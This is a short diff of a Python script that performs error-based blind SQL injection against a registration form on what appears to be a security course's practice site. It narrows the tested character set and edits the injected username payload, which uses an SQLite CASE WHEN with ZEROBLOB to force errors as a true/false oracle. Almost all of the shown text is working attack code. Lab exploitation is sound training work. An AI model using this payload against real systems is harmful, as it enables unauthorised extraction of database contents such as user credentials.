@@ -3,14 +3,12 @@ import string
 
 url = "https://sql-injection-medium.is-course.ru/register"
 headers = {}
-
-# Characters to test (adjust as needed)
-chars = string.ascii_letters + string.digits
+chars = string.ascii_lowercase + string.digits
 
 def test_condition(condition):
     """Test a boolean condition. Returns True if error occurs."""
     data = {
-        "username": f"test'||(SELECT CASE WHEN ({condition}) THEN ZEROBLOB(1000000000) ELSE 1 END)||'",
+        "username": f"testadeaf'||(SELECT CASE WHEN ({condition}) THEN ZEROBLOB(1000000000) ELSE 1 END)||'",
         "email": "test@test",
         "password": "test123"
     }
